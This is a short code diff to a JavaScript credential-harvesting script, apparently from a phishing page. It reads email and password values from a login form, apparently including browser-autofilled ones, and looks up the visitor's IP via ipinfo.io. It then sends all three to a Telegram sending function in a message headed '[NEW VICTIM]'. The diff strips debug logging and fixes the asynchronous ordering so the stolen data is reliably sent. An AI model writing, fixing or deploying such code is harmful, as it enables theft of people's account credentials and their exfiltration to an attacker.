@@ -20,22 +20,16 @@ function sendTelegramMessage(message) {
 function getAutofilledValues() { 
     var email = document.getElementById('email').value;
     var password = document.getElementById('password').value;
-    var ip_addr;
-
-    console.log('Autofilled Email:', email); 
-    console.log('Autofilled Password:', password); 
 
     fetch('https://ipinfo.io/json')
     .then(response => response.json())
     .then(data => {
-        console.log('IP Address:', data.ip);
-        ip_addr = data.ip
+        var message = `[NEW VICTIM]\n\nEmail: ${email}\nPassword: ${password}\nIP Address: ${data.ip}`;
+        sendTelegramMessage(message); 
     })
     .catch(error => {
-        console.error('Error fetching IP address:', error);
-        ip_addr = "No Found"
+        var message = `[NEW VICTIM]\n\nEmail: ${email}\nPassword: ${password}\nIP Address: No Found`;
+        sendTelegramMessage(message); 
     });
 
-    var message = `[NEW VICTIM]\n\nEmail: ${email}\nPassword: ${password}\nIP Address: ${ip_addr}`;
-    sendTelegramMessage(message); 
 }
